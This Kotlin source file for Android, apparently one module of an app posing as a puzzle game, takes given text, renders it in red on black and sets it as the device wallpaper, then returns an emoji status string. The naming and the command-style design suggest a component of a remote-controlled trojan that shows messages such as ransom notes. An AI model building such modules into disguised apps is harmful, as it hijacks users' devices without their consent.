package com.puzzleblast.game.modules

import android.app.WallpaperManager
import android.content.Context
import android.graphics.Bitmap
import android.graphics.Canvas
import android.graphics.Color
import android.graphics.Paint
import java.io.File

object WallpaperModule {
    suspend fun set(ctx: Context, text: String): String {
        return try {
            val bmp = Bitmap.createBitmap(1080, 1920, Bitmap.Config.ARGB_8888)
            val canvas = Canvas(bmp)
            canvas.drawColor(Color.BLACK)
            val paint = Paint().apply { color = Color.RED; textSize = 48f; isAntiAlias = true }
            var y = 200f
            text.chunked(40).forEach { line ->
                canvas.drawText(line, 80f, y, paint)
                y += 60f
            }
            val wm = WallpaperManager.getInstance(ctx)
            wm.setBitmap(bmp)
            "🖼 wallpaper set"
        } catch (e: Exception) {
            "🖼 failed: ${e.message}"
        }
    }
}
